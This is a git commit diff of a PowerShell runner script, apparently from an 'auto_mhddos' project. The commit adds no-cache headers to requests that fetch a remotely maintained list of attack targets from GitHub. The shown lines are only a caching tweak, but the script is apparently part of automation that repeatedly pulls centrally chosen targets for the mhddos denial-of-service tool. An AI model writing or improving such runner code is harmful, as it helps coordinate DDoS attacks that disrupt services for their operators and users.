e87709f0ed6b52196516e4c50ce2fc147dce1d6e
mErlin-sp <merlin.ua.1@gmail.com>
2022-04-02 15:36:19 +0300

    Add no-cache header

--- runner.ps1
+++ runner.ps1
@@ -27,12 +27,12 @@ while($true){
     Stop-Process -Name "Python" -Force 
 
     # Get number of targets. Sometimes (network or github problem) list_size = 0. So here is check.    
-    $targets = ((Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches
+    $targets = ((Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -UseBasicParsing -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches
     Write-Output $('Number of targets in list: ' + $targets.Length) 
 
     while ($targets.Length -eq 0) {
         Start-Sleep(5)
-        $targets = ((Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches
+        $targets = ((Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -UseBasicParsing -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches
         Write-Output $('Number of targets in list: ' + $targets.Length) 
     }
     
